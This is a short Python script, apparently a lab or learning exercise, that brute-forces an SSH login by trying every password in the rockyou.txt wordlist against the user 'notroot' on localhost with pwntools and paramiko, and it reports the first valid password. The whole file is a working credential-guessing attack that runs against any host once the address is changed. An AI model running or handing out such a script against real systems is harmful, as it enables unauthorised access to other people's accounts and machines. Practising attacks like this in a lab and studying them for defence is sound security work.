from pwn import *
import paramiko


host = "127.0.0.1"
username = "notroot"
attempts = 0 #iterator used to limit, count attempts
password_file = "rockyou.txt"

with open(password_file, "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting Password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print("[>] Valid Password: '{}'!".format(password))
                break    
            response.close() #exit if password not found
            
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid Password!")
        attempts += 1